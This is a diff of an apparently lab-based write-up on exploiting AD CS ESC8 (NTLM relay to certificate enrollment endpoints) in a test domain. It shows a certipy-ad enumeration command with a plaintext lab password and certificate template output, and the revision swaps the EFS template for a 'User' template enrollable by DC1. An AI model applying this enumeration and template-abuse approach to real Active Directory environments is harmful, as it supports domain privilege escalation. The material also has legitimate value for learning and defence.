@@ -612,27 +612,28 @@ https://www.hackingarticles.in/adcs-esc8-ntlm-relay-to-ad-cs-http-endpoints/
 So there is a vulnerable HTTP endpoint on DC2 which i can use to relay authentication to!
 
 ```python
-certipy-ad find -u mike.silver@dismay.hsm -p 'Password123!' -dc-host dc1.dismay.hsm -stdout | grep -B 30 'Domain Users'
-Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
-        Write Property Enroll           : DISMAY.HSM\Domain Admins
-                                          DISMAY.HSM\Enterprise Admins
-  27
-    Template Name                       : EFS
-    Display Name                        : Basic EFS
+
+  32
+    Template Name                       : User
+    Display Name                        : User
     Certificate Authorities             : dismay-DC2-CA
     Enabled                             : True
-    Client Authentication               : False
+    Client Authentication               : True
     Enrollment Agent                    : False
     Any Purpose                         : False
     Enrollee Supplies Subject           : False
     Certificate Name Flag               : SubjectAltRequireUpn
+                                          SubjectAltRequireEmail
+                                          SubjectRequireEmail
                                           SubjectRequireDirectoryPath
     Enrollment Flag                     : IncludeSymmetricAlgorithms
                                           PublishToDs
                                           AutoEnrollment
     Private Key Flag                    : ExportableKey
     Extended Key Usage                  : Encrypting File System
+                                          Secure Email
+                                          Client Authentication
     Requires Manager Approval           : False
     Requires Key Archival               : False
     Authorized Signatures Required      : 0
@@ -641,11 +642,11 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
     Renewal Period                      : 6 weeks
     Minimum RSA Key Length              : 2048
     Template Created                    : 2025-12-12T13:42:01+00:00
-    Template Last Modified              : 2025-12-12T13:42:16+00:00
+    Template Last Modified              : 2025-12-12T13:51:16+00:00
     Permissions
       Enrollment Permissions
-        Enrollment Rights               : DISMAY.HSM\Domain Admins
-                                          DISMAY.HSM\Domain Users
+        Enrollment Rights               : DISMAY.HSM\DC1
+                                          DISMAY.HSM\Domain Admins
                                           DISMAY.HSM\Enterprise Admins
       Object Control Permissions
         Owner                           : DISMAY.HSM\Enterprise Admins
@@ -656,13 +657,10 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
         Write Dacl Principals           : DISMAY.HSM\Domain Admins
                                           DISMAY.HSM\Enterprise Admins
         Write Property Enroll           : DISMAY.HSM\Domain Admins
-                                          DISMAY.HSM\Domain Users
                                           DISMAY.HSM\Enterprise Admins
-    [+] User Enrollable Principals      : DISMAY.HSM\Domain Users
-```
-So the next step was to find a valid template i can use, `EFS` should work since Domain users have enrollment rights
 
-By grepping for Domain Users it will find any templates referencing this which gives me a template with enrollment rights needed to exploit esc8
+```
+Ive found an enabled template that has dc1 has an enrollment
 
 
 
